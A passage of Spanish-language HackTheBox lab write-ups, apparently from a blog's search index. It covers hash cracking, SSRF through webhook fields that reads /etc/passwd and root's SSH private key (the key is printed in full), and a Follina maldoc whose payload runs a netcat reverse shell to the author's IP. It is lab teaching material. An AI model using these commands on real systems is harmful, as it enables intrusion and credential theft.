Runtime...: 2 secs sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=:february15 Session..........: hashcat Status...........: Cracked Hash.Name........: PBKDF2-HMAC-SHA256 Hash.Target......: sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U...9O/jc= Time.Started.....: Mon Sep 5 17:40:50 2022, (22 secs) Time.Estimated...: Mon Sep 5 17:41:12 2022, (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 3230 H/s (7.72ms) @ Accel:256 Loops:256 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 71680/14344385 (0.50%) Rejected.........: 0/71680 (0.00%) Restore.Point....: 70656/14344385 (0.49%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9984-9999 Candidates.#1....: jordan28 -\u0026gt; 280282 Started: Mon Sep 5 17:39:53 2022 Stopped: Mon Sep 5 17:41:13 2022 π ~/htb/health ❯ User - Susanne Utilizamos el usuario y contraseña que obtuvimos de Gogs, por SSH, logrando obtener una shell y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 π ~/htb/health ❯ ssh susanne@10.10.11.176 # february15 susanne@10.10.11.176\u0026#39;s password: Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-191-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon Sep 5 23:42:19 UTC 2022 System load: 0.0 Processes: 179 Usage of /: 67.8% of 3.84GB Users logged in: 1 Memory usage: 12% IP address for eth0: 10.10.11.176 Swap usage: 0% 0 updates can be applied immediately. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Mon Sep 5 22:04:15 2022 from 10.10.14.172 susanne@health:~$ whoami;id;pwd susanne uid=1000(susanne) gid=1000(susanne) groups=1000(susanne) /home/susanne susanne@health:~$ ls user.txt susanne@health:~$ cat user.txt 0397ddfadaa8ac6458fcf7db646b5ccf susanne@health:~$ Privesc Tras ejecutar pspy observamos un cronjob que ejecuta como root artisan.\n1 2 3 4 5 6 7 8 9 10 11 12 2022/09/06 00:26:01 CMD: UID=0 PID=22324 | /bin/bash -c sleep 5 \u0026amp;\u0026amp; /root/meta/clean.sh 2022/09/06 00:26:01 CMD: UID=0 PID=22323 | /bin/bash -c cd /var/www/html \u0026amp;\u0026amp; php artisan schedule:run \u0026gt;\u0026gt; /dev/null 2\u0026gt;\u0026amp;1 2022/09/06 00:26:01 CMD: UID=0 PID=22322 | /usr/sbin/CRON -f 2022/09/06 00:26:01 CMD: UID=0 PID=22321 | /usr/sbin/CRON -f 2022/09/06 00:26:01 CMD: UID=0 PID=22326 | sleep 5 2022/09/06 00:26:01 CMD: UID=0 PID=22325 | /bin/bash -c cd /var/www/html \u0026amp;\u0026amp; php artisan schedule:run \u0026gt;\u0026gt; /dev/null 2\u0026gt;\u0026amp;1 2022/09/06 00:26:01 CMD: UID=0 PID=22329 | grep columns 2022/09/06 00:26:01 CMD: UID=0 PID=22328 | stty -a 2022/09/06 00:26:01 CMD: UID=0 PID=22327 | sh -c stty -a | grep columns 2022/09/06 00:26:01 CMD: UID=0 PID=22332 | grep columns 2022/09/06 00:26:01 CMD: UID=0 PID=22330 | sh -c stty -a | grep columns 2022/09/06 00:26:06 CMD: UID=0 PID=22333 | mysql laravel --execute TRUNCATE tasks Si observamos los \u0026ldquo;cronjobs\u0026rdquo; de artisan no se muestra ninguno.\n1 2 3 4 5 susanne@health:/var/www/html$ php artisan schedule:list +---------+----------+-------------+----------+ | Command | Interval | Description | Next Due | +---------+----------+-------------+----------+ susanne@health:/var/www/html$ Si intentamos crear un cronjob o webhook desde la página este se agrega a la lista, y el cronjob seguramente lo ejecuta como root.\n1 2 3 4 5 6 7 susanne@health:/var/www/html$ php artisan schedule:list +---------+-------------+-------------+----------------------------+ | Command | Interval | Description | Next Due | +---------+-------------+-------------+----------------------------+ | | */1 * * * * | | 2022-09-06 00:50:00 +00:00 | +---------+-------------+-------------+----------------------------+ susanne@health:/var/www/html$ Como sabemos el webhook no acepta ningun tipo de archivo o alguna dirección local, sin embargo observamos las credenciales de la base de datos en el archivo .env del sitio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 susanne@health:/var/www/html$ cat .env APP_NAME=Laravel APP_ENV=local APP_KEY=base64:x12LE6h+TU6x4gNKZIyBOmthalsPLPLv/Bf/MJfGbzY= APP_DEBUG=true APP_URL=http://localhost LOG_CHANNEL=stack LOG_DEPRECATIONS_CHANNEL=null LOG_LEVEL=debug DB_CONNECTION=mysql DB_HOST=127.0.0.1 DB_PORT=3306 DB_DATABASE=laravel DB_USERNAME=laravel DB_PASSWORD=MYsql_strongestpass@2014+ [.. snip ..] susanne@health:/var/www/html$ Tras ingresar a la base de datos, descubrimos los datos de los webhook en la tabla tasks.\n1 2 3 4 5 6 7 8 9 mysql\u0026gt; select * from tasks; +--------------------------------------+---------------------+-----------+---------------------+-------------+---------------------+---------------------+ | id | webhookUrl | onlyError | monitoredUrl | frequency | created_at | updated_at | +--------------------------------------+---------------------+-----------+---------------------+-------------+---------------------+---------------------+ | 623acc92-93b0-4b95-968f-3209b83bda62 | http://10.10.14.207 | 1 | http://10.10.14.207 | */1 * * * * | 2022-09-06 00:50:50 | 2022-09-06 00:50:50 | +--------------------------------------+---------------------+-----------+---------------------+-------------+---------------------+---------------------+ 1 row in set (0.00 sec) mysql\u0026gt; Creamos un weebhook e intentamos cambiar la url de la columna monitoredUrl para obtener el archivo /etc/passwd, en este caso la de todos los webhooks disponibles.\n1 2 3 4 5 mysql\u0026gt; update tasks set monitoredUrl = \u0026#39;file:///etc/passwd\u0026#39;; Query OK, 1 row affected (0.01 sec) Rows matched: 1 Changed: 1 Warnings: 0 mysql\u0026gt; Tras realizar este cambio observamos el contenido en nuestro servidor python.\n1 2 10.10.11.176 - - [05/Sep/2022 19:13:03] \u0026#34;POST / HTTP/1.1\u0026#34; 200 - b\u0026#39;{\u0026#34;webhookUrl\u0026#34;:\u0026#34;http:\\\\/\\\\/10.10.14.207\u0026#34;,\u0026#34;monitoredUrl\u0026#34;:\u0026#34;file:\\\\/\\\\/\\\\/etc\\\\/passwd\u0026#34;,\u0026#34;health\u0026#34;:\u0026#34;up\u0026#34;,\u0026#34;body\u0026#34;:\u0026#34;root:x:0:0:root:\\\\/root:\\\\/bin\\\\/bash\\\\ndaemon:x:1:1:daemon:\\\\/usr\\\\/sbin:\\\\/usr\\\\/sbin\\\\/nologin\\\\nbin:x:2:2:bin:\\\\/bin:\\\\/usr\\\\/sbin\\\\/nologin\\\\nsys:x:3:3:sys:\\\\/dev:\\\\/usr\\\\/sbin\\\\/nologin\\\\nsync:x:4:65534:sync:\\\\/bin:\\\\/bin\\\\/sync\\\\ngames:x:5:60:games:\\\\/usr\\\\/games:\\\\/usr\\\\/sbin\\\\/nologin\\\\nman:x:6:12:man:\\\\/var\\\\/cache\\\\/man:\\\\/usr\\\\/sbin\\\\/nologin\\\\nlp:x:7:7:lp:\\\\/var\\\\/spool\\\\/lpd:\\\\/usr\\\\/sbin\\\\/nologin\\\\nmail:x:8:8:mail:\\\\/var\\\\/mail:\\\\/usr\\\\/sbin\\\\/nologin\\\\nnews:x:9:9:news:\\\\/var\\\\/spool\\\\/news:\\\\/usr\\\\/sbin\\\\/nologin\\\\nuucp:x:10:10:uucp:\\\\/var\\\\/spool\\\\/uucp:\\\\/usr\\\\/sbin\\\\/nologin\\\\nproxy:x:13:13:proxy:\\\\/bin:\\\\/usr\\\\/sbin\\\\/nologin\\\\nwww-data:x:33:33:www-data:\\\\/var\\\\/www:\\\\/usr\\\\/sbin\\\\/nologin\\\\nbackup:x:34:34:backup:\\\\/var\\\\/backups:\\\\/usr\\\\/sbin\\\\/nologin\\\\nlist:x:38:38:Mailing List Manager:\\\\/var\\\\/list:\\\\/usr\\\\/sbin\\\\/nologin\\\\nirc:x:39:39:ircd:\\\\/var\\\\/run\\\\/ircd:\\\\/usr\\\\/sbin\\\\/nologin\\\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):\\\\/var\\\\/lib\\\\/gnats:\\\\/usr\\\\/sbin\\\\/nologin\\\\nnobody:x:65534:65534:nobody:\\\\/nonexistent:\\\\/usr\\\\/sbin\\\\/nologin\\\\nsystemd-network:x:100:102:systemd Network Management,,,:\\\\/run\\\\/systemd\\\\/netif:\\\\/usr\\\\/sbin\\\\/nologin\\\\nsystemd-resolve:x:101:103:systemd Resolver,,,:\\\\/run\\\\/systemd\\\\/resolve:\\\\/usr\\\\/sbin\\\\/nologin\\\\nsyslog:x:102:106::\\\\/home\\\\/syslog:\\\\/usr\\\\/sbin\\\\/nologin\\\\nmessagebus:x:103:107::\\\\/nonexistent:\\\\/usr\\\\/sbin\\\\/nologin\\\\n_apt:x:104:65534::\\\\/nonexistent:\\\\/usr\\\\/sbin\\\\/nologin\\\\nlxd:x:105:65534::\\\\/var\\\\/lib\\\\/lxd\\\\/:\\\\/bin\\\\/false\\\\nuuidd:x:106:110::\\\\/run\\\\/uuidd:\\\\/usr\\\\/sbin\\\\/nologin\\\\ndnsmasq:x:107:65534:dnsmasq,,,:\\\\/var\\\\/lib\\\\/misc:\\\\/usr\\\\/sbin\\\\/nologin\\\\nlandscape:x:108:112::\\\\/var\\\\/lib\\\\/landscape:\\\\/usr\\\\/sbin\\\\/nologin\\\\npollinate:x:109:1::\\\\/var\\\\/cache\\\\/pollinate:\\\\/bin\\\\/false\\\\nsshd:x:110:65534::\\\\/run\\\\/sshd:\\\\/usr\\\\/sbin\\\\/nologin\\\\nsusanne:x:1000:1000:susanne:\\\\/home\\\\/susanne:\\\\/bin\\\\/bash\\\\ngogs:x:1001:1001::\\\\/home\\\\/gogs:\\\\/bin\\\\/bash\\\\nmysql:x:111:114:MySQL Server,,,:\\\\/nonexistent:\\\\/bin\\\\/false\\\\n\u0026#34;}\u0026#39; Shell Cambiamos la dirección esta vez a la clave privada SSH del usuario root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 mysql\u0026gt; update tasks set monitoredUrl = \u0026#39;file:///root/.ssh/id_rsa\u0026#39;; Query OK, 1 row affected (0.00 sec) Rows matched: 1 Changed: 1 Warnings: 0 mysql\u0026gt; select * from tasks; +--------------------------------------+---------------------+-----------+--------------------------+-------------+---------------------+---------------------+ | id | webhookUrl | onlyError | monitoredUrl | frequency | created_at | updated_at | +--------------------------------------+---------------------+-----------+--------------------------+-------------+---------------------+---------------------+ | c7f1c2cc-cd14-4391-a622-70bd40dcbfac | http://10.10.14.207 | 0 | file:///root/.ssh/id_rsa | */1 * * * * | 2022-09-06 01:15:10 | 2022-09-06 01:15:10 | +--------------------------------------+---------------------+-----------+--------------------------+-------------+---------------------+---------------------+ 1 row in set (0.00 sec) mysql\u0026gt; Observamos la clave en la solicitud POST.\n1 2 10.10.11.176 - - [05/Sep/2022 19:16:04] \u0026#34;POST / HTTP/1.1\u0026#34; 200 - b\u0026#39;{\u0026#34;webhookUrl\u0026#34;:\u0026#34;http:\\\\/\\\\/10.10.14.207\u0026#34;,\u0026#34;monitoredUrl\u0026#34;:\u0026#34;file:\\\\/\\\\/\\\\/root\\\\/.ssh\\\\/id_rsa\u0026#34;,\u0026#34;health\u0026#34;:\u0026#34;up\u0026#34;,\u0026#34;body\u0026#34;:\u0026#34;-----BEGIN RSA PRIVATE KEY-----\\\\nMIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9\\\\/jG5NPqc2TfW4Nlj9gE\\\\nKScDJTrF0vXYnIy4yUwM4\\\\/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq\\\\nIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH\\\\/\\\\nKuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL\\\\/XP1hN4B7egzjcV8Rphj6XRE3bhgH\\\\n7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8\\\\nW6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae\\\\nNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9\\\\nt3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8\\\\/v\\\\/3Jeesznu+RJ+G0ezyUGfi0wpQRoD\\\\nC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI\\\\/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl\\\\nhnqFXpOWB771WnW9yH7\\\\/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x\\\\/LUyan++D+8\\\\nefiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2\\\\n1bLlZQECgYEA9iT13rdKQ\\\\/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj\\\\nnVhtw6NRFZ1Gfu21kPTCUTK34iX\\\\/p\\\\/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3\\\\nsqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou\\\\nfEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q\\\\n0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ\\\\nzkbVWX3JRDh4vdFOBGB\\\\/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT\\\\nrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB\\\\nN1ZI4E59+O3Z15VgZ\\\\/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD\\\\nSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o\\\\n++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp\\\\nUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR\\\\/xkIP\\\\/Mog1a\\\\nvmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU\\\\n6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC\\\\/cQbPm\\\\nQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G\\\\n-----END RSA PRIVATE KEY-----\\\\n\u0026#34;}\u0026#39; Utilizamos la clave privada por SSH logrando obtener una shell como root y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 π ~/htb/health ❯ nano root_id_rsa π ~/htb/health ❯ chmod 400 root_id_rsa π ~/htb/health ❯ ssh -i root_id_rsa root@10.10.11.176 Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-191-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue Sep 6 01:19:24 UTC 2022 System load: 0.02 Processes: 190 Usage of /: 67.8% of 3.84GB Users logged in: 1 Memory usage: 19% IP address for eth0: 10.10.11.176 Swap usage: 0% 0 updates can be applied immediately. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings root@health:~# whoami;id;pwd root uid=0(root) gid=0(root) groups=0(root) /root root@health:~# ls meta root.txt root@health:~# cat root.txt d542f0c03c441b5894a1e19e6bc3053e root@health:~# Cronjobs Como usuario root observamos que existen dos cronjobs, uno es el que ejecuta artisan cada minuto, y otro elimina todos los datos de la columna tasks.\n1 2 3 4 5 6 7 8 9 root@health:~# crontab -l | grep -v \u0026#34;#\u0026#34; SHELL=/bin/bash * * * * * cd /var/www/html \u0026amp;\u0026amp; php artisan schedule:run \u0026gt;\u0026gt; /dev/null 2\u0026gt;\u0026amp;1 * * * * * sleep 5 \u0026amp;\u0026amp; /root/meta/clean.sh root@health:~# cat /root/meta/clean.sh #! /bin/bash echo \u0026#34;Cleaning Tasks in database\u0026#34; mysql laravel --execute \u0026#34;TRUNCATE tasks\u0026#34; root@health:~# ","description":"En Health descubrimos Gogs a traves de redirecciónes realizadas con Python, por el sitio web que expone una funcionalidad de monitoreo de servicios web. Mediante una inyeccion SQL obtuvimos credenciales para acceder por SSH. Finalmente escalamos privilegios por medio de artisan y la funcionalidad del sitio web.","id":9,"section":"posts","tags":["webhook","php","python","gogs","sqli","sqlite","hashcat","artisan","laravel"],"title":"HackTheBox - Health","uri":"https://sckull.github.io/posts/health/"},{"content":"\rLa explotación de la vulnerabilidad Follina nos dió acceso a la máquina a un primer usuario. Con la ejecución de SharpHoond obtuvimos información que nos permitió acceder a un segundo usuario. Finalmente escalamos privilegios, ejecutando comandos por Wsus utilizando la herramienta SharpWSUS.\nNombre Outdated OS Windows Puntos 30 Dificultad Media IP 10.10.11.175 Maker ctrlzero\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.6, 6, 6, 4.1, 4],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: smtp (25), DNS (53), RPC (135), ldap/ssl (389, 636, 3268, 3269), smb (), http (8530) y winrm (5985).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 π ~/htb/outdated ❯ cat nmap_scan # Nmap 7.92 scan initiated Sun Aug 14 16:22:01 2022 as: nmap -Pn -p25,53,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,49667,49669,49670,49672,49884,49903,49923 -sV -sC -oN nmap_scan 10.10.11.175 Nmap scan report for 10.10.11.175 (10.10.11.175) Host is up (0.079s latency). PORT STATE SERVICE VERSION 25/tcp open smtp hMailServer smtpd | smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-15 05:22:04Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED | Not valid before: 2022-06-18T05:50:24 |_Not valid after: 2024-06-18T06:00:24 |_ssl-date: 2022-08-15T05:23:42+00:00; +6h59m57s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) |_ssl-date: 2022-08-15T05:23:41+00:00; +6h59m56s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED | Not valid before: 2022-06-18T05:50:24 |_Not valid after: 2024-06-18T06:00:24 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED | Not valid before: 2022-06-18T05:50:24 |_Not valid after: 2024-06-18T06:00:24 |_ssl-date: 2022-08-15T05:23:42+00:00; +6h59m57s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED | Not valid before: 2022-06-18T05:50:24 |_Not valid after: 2024-06-18T06:00:24 |_ssl-date: 2022-08-15T05:23:41+00:00; +6h59m56s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 8530/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn\u0026#39;t have a title. | http-methods: |_ Potentially risky methods: TRACE 8531/tcp open unknown 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49670/tcp open msrpc Microsoft Windows RPC 49672/tcp open msrpc Microsoft Windows RPC 49884/tcp open msrpc Microsoft Windows RPC 49903/tcp open msrpc Microsoft Windows RPC 49923/tcp open msrpc Microsoft Windows RPC Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 6h59m56s, deviation: 0s, median: 6h59m56s | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required | smb2-time: | date: 2022-08-15T05:23:04 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Aug 14 16:23:45 2022 -- 1 IP address (1 host up) scanned in 104.62 seconds Web Site Los headers del sitio web muestran un Microsoft IIS 10.0. Sin embargo no muestra ningun tipo de contenido al visitar tal dirección.\n1 2 3 4 5 6 π ~/htb/outdated ❯ curl -sI http://10.10.11.175:8530/ HTTP/1.1 200 OK Content-Length: 0 Server: Microsoft-IIS/10.0 X-Powered-By: ASP.NET Date: Mon, 15 Aug 2022 05:27:24 GMT SMB Una sesión nula por samba nos muestra distintos recursos compartidos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 π ~/htb/outdated ❯ smbclient -L outdated.htb -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Shares Disk SYSVOL Disk Logon server share UpdateServicesPackages Disk A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system. WsusContent Disk A network share to be used by Local Publishing to place published content on this WSUS system. WSUSTemp Disk A network share used by Local Publishing from a Remote WSUS Console Instance. SMB1 disabled -- no workgroup available π ~/htb/outdated ❯ Tras acceder al recurso \\Shares observamos un unico archivo PDF.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 π ~/htb/outdated ❯ smbclient \\\\\\\\outdated.htb\\\\Shares -N Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Mon Jun 20 09:01:33 2022 .. D 0 Mon Jun 20 09:01:33 2022 NOC_Reminder.pdf AR 106977 Mon Jun 20 09:00:32 2022 9116415 blocks of size 4096. 1459412 blocks available smb: \\\u0026gt; get NOC_Reminder.pdf getting file \\NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (109.0 KiloBytes/sec) (average 109.0 KiloBytes/sec) smb: \\\u0026gt; exit π ~/htb/outdated ❯ file NOC_Reminder.pdf NOC_Reminder.pdf: PDF document, version 1.3 π ~/htb/outdated ❯ El PDF menciona una brecha de seguridad y que, se necesita reconstruir los servidores principales. Tambien menciona que para poder agregar los servicios en la plataforma de monitoreo es posible enviar la url del servicio al correo itsupport@outdated.htb.\nAdemás se listan CVEs los cuales se deben de verificar que estén parcheados.\nUser - Btables Mail nmap muestra un dominio, y subdominio para mail, tras agregar estos al archivo /etc/passwd enviamos un correo con la direccion url de nuestra máquina utilizando swaks.\n1 swaks --to itsupport@outdated.htb --from itsupport@sckull --header \u0026#34;Subject: mail\u0026#34; --body \u0026#34;http://10.10.14.207/\u0026#34; --server mail.outdated.htb Observamos que netcat muestra una solicitud, vemos el User-Agent perteneciente a Windows. Unicamente logramos obtener solicitudes http.\n1 2 3 4 5 6 7 π ~/htb/outdated ❯ sudo nc -lvvp 80 listening on [any] 80 ... connect to [10.10.14.207] from outdated.htb [10.10.11.175] 49802 GET / HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.906 Host: 10.10.14.207 Connection: Keep-Alive CVE-2022-30190 - Follina Si volvemos al PDF se lista la vulnerabilidad Follina, esta utiliza una plantilla de Word y un servidor http para cargar codigo y ejecutar por PowerShell. Existen distintos PoCs en GitHub (1, 2).\nUtilizamos el PoC de JohnHammond, ejecutamos el script con privilegios root para poder correr el servidor http en puerto 80, agregamos un comando para su ejecución, en este caso copiamos netcat desde un servidor samba a la máquina para luego ejecutar una shell inversa.\n1 2 3 4 5 π msdt-follina main ✗ ❯ sudo ./follina.py -i tun1 -o follina.doc -p 80 -c \u0026#39;copy \\\\10.10.14.207\\share\\nc.exe .; .\\nc.exe -e powershell.exe 10.10.14.207 1335\u0026#39; [+] copied staging doc /tmp/ps303lyd [+] created maldoc follina.doc [+] command: copy \\\\10.10.14.207\\share\\nc.exe .; .\\nc.exe -e powershell.exe 10.10.14.207 1335 [+] serving html payload on :80 Tras ejecutar el servidor samba y enviar el correo con la URL, logramos obtener una shell por el puerto 1335 como btables.\n1 2 3 4 5 6 7 8 9 10 11 π ~/htb/outdated ❯ rlwrap nc -lvp 1335 listening on [any] 1335 ... connect to [10.10.14.207] from outdated.htb [10.10.11.175] 49851 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. Try the new cross-platform PowerShell https://aka.ms/pscore6 PS C:\\Users\\btables\\AppData\\Local\\Temp\\SDIAG_9a809ec6-0b8b-489c-b756-d6843da08409\u0026gt; whoami outdated\\btables PS C:\\Users\\btables\\AppData\\Local\\Temp\\SDIAG_9a809ec6-0b8b-489c-b756-d6843da08409\u0026gt; User - Sflowers Observando los grupos del usuario btables, se lista el grupo ITStaff.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 PS C:\\\u0026gt; whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ========================================== ================ ============================================ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group OUTDATED\\ITStaff Group S-1-5-21-4089647348-67660539-4016542185-1107 Mandatory group, Enabled by default, Enabled group Authentication authority asserted identity Well-known group S-1-18-1 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Mandatory Level Label S-1-16-8192 PS C:\\\u0026gt; net group ITStaff This command can be used only on a Windows Domain Controller. More help is available by typing NET HELPMSG 3515. PS C:\\\u0026gt; Ya que no obtuvimos mucha información, descargamos y ejecutamos SharpHound en la máquina, copiamos el archivo zip a nuestra máquina local e importamos este ultimo a Bloodhound.\nEncontramos que el usuario btables puede obtener acceso al usuario Sflowers mediante le grupo ITStaff, sobreescribiendo la propiedad msds-KeyCredentialLink del usuario. Para ello existe la herramienta Whisker.\nref.\nShadow Credentials Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover Shadow Credentials Tras ejecutar whisker agregando un nuevo valor a la propiedad msDS-KeyCredentialLink se muestra el comando para obtener un ticket utilizando Rubeus.\n1 2 3 4 5 6 7 8 9 10 11 12 13 